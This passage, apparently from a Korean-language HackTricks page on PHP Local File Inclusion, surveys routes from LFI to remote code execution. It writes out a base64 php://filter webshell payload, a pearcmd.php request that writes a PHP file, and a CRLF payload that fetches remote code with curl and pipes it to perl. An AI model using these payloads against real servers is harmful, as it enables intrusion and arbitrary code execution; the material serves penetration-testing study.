이 [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article에서 보이는 것처럼, PHP base64 filter는 Non-base64를 무시합니다. 이를 이용해 파일 확장자 검사를 우회할 수 있습니다: base64가 ".php"로 끝나도록 공급하면, filter는 "."을 무시하고 "php"를 base64에 붙입니다. 예시 payload는 다음과 같습니다:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (파일 필요 없음)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)설명은 **php filters를 사용해 임의의 콘텐츠를 출력으로 생성할 수 있다**는 것이다. 기본적으로 이는 include에 대해 **임의의 php 코드를 생성할 수 있다**는 뜻이며, 파일로 **직접 쓰지 않아도 된다**.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**업로드**한 파일은 `/tmp`에 **임시**로 저장되고, 같은 **요청에서** **segmentation fault**를 발생시키면 그 **임시 파일이 삭제되지 않아** 검색할 수 있다.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx 임시 파일 저장

만약 **Local File Inclusion**을 발견했고 **Nginx**가 PHP 앞에서 실행 중이라면 다음 기법으로 RCE를 얻을 수 있다:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

세션이 없고 `session.auto_start`가 `Off`여도 **Local File Inclusion**을 발견했다면, **multipart POST** 데이터에 **`PHP_SESSION_UPLOAD_PROGRESS`**를 제공하면 PHP가 **세션을 활성화**한다. 이를 악용해 RCE를 얻을 수 있다:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via Windows에서의 임시 파일 업로드

만약 **Local File Inclusion**을 발견했고 서버가 **Windows**에서 실행 중이라면 RCE를 얻을 수도 있다:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), the script `/usr/local/lib/phppearcmd.php` exists by default in php docker images. Moreover, it's possible to pass arguments to the script via the URL because it's indicated that if a URL param doesn't have an `=`, it should be used as an argument. See also [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) and [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

다음 요청은 `/tmp/hello.php`에 내용 `<?=phpinfo()?>`인 파일을 생성한다:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
다음은 CRLF vuln을 악용해 RCE를 얻는 사례입니다 (출처: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo()를 통해 (file_uploads = on)

만약 **Local File Inclusion**를 발견했고 file_uploads = on인 **phpinfo()**를 노출하는 파일을 찾았다면 RCE를 얻을 수 있습니다:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure를 통해

만약 **Local File Inclusion**를 발견했고 임시 파일의 경로를 **can exfiltrate the path** 할 수 있지만 **server**가 포함될 파일에 PHP 마크가 있는지를 **checking** 한다면, 이 **Race Condition**으로 그 검사를 **bypass that check** 시도해볼 수 있습니다:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce를 통해

만약 LFI를 악용해 **upload temporary files** 하고 서버가 PHP 실행을 **hang** 하게 만들 수 있다면, 몇 시간 동안 파일명을 **brute force filenames during hours** 하여 임시 파일을 찾을 수 있습니다:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error로

다음 파일들 중 하나를 포함하면 `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (동일한 파일을 2번 포함해야 해당 오류를 발생시킬 수 있습니다).

**이게 어떻게 유용한지는 잘 모르겠지만 가능성은 있습니다.**\
_PHP Fatal Error를 발생시키더라도 업로드된 PHP 임시 파일은 삭제됩니다._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
